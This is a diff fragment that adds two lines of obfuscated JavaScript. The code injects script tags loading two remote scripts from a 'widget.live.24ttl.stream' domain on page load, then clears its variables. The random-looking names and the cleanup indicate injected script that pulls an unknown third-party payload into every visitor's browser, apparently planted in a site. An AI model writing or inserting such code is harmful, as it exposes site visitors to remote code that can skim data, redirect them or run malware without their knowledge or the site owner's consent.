@@ -1,0 +1,2 @@
+var aljsdklzxnlck2312jk3lsa=['https://widget.live.24ttl.stream/js/widget.js','https://widget.live.24ttl.stream/js/app.js'];for(var sajdjsalkdjl21321=0;sajdjsalkdjl21321<aljsdklzxnlck2312jk3lsa.length;sajdjsalkdjl21321++){var ouhtouqqwhodnosandojnowque=document.createElement('script');ouhtouqqwhodnosandojnowque.setAttribute('src',aljsdklzxnlck2312jk3lsa[sajdjsalkdjl21321]);document.body.appendChild(ouhtouqqwhodnosandojnowque)}
+aljsdklzxnlck2312jk3lsa=undefined;sajdjsalkdjl21321=undefined;ouhtouqqwhodnosandojnowque=undefined
